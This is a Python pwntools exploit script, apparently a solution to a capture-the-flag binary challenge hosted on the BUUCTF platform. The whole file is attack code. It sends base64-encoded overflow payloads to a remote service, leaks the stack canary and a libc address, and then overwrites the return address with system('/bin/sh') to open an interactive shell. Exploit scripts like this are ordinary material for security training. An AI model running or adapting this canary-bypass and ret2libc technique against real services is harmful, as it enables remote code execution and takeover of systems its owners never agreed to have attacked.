#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from base64 import b64encode as b64
import pdb
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
libc=ELF('../../i386libc/x86_libc.so.6')

# io = process("./pwns")
io=remote('node3.buuoj.cn',25020)

def sendData(payload, final = False):
    io.sendlineafter("[Y/N]\n", "Y")
    io.sendlineafter("datas:\n\n", b64(payload))
    #  pdb.set_trace()
    if final:
        return
    else:
        io.recvuntil("Result is:")
        data = io.recvuntil("May be I", drop = True)
        return data

def getCanary():
    len = 0x10d - 0xc + 1
    payload = cyclic(len)
    canary = sendData(payload)[258: 261]
    return u32("\x00" + canary)

def getLibc():
    len = 0x17c - 0x2b 
    payload = cyclic(len)
    leaked = sendData(payload)[337: 337 + 4]
    return u32(leaked) - 247 - libc.sym['__libc_start_main']

if __name__ == "__main__":
    canary = getCanary()
    libc_base = getLibc()
    # getshell_addr = libc_base + 0x5F7A6
    # payload = cyclic(0x10d - 0xc) + p32(canary) + cyclic(0xc) + p32(getshell_addr)
    sh_addr = libc_base + libc.search('/bin/sh').next()
    sys_addr = libc_base + libc.sym['system']
    payload = cyclic(0x10d - 0xc) + p32(canary) + cyclic(0xc) + p32(sys_addr) + p32(0xdeadbeef) + p32(sh_addr)

    sendData(payload, True)
    success('libc_base'+hex(libc_base))
    
    io.interactive()
    #io.close()